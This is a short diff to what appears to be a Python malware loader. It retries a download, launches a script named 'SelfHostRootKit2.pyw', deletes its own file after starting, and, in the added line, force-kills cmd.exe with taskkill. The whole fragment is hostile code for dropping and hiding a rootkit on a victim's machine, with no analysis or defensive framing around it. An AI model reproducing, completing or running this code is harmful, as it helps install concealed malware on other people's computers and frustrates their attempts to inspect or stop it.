@@ -113,7 +113,7 @@ while tryit == False:
         print("download ending")
     except:
         print("download error")
-        time.sleep(0.5)
+        time.sleep(2)
 
 def open():
     subprocess.Popen("SelfHostRootKit2.pyw", shell=True)
@@ -124,4 +124,5 @@ if __name__ == "__main__":
     p.start()
     time.sleep(4)
     os.remove(getFileName())
+    subprocess.Popen("taskkill /IM cmd.exe /F")
     exit()
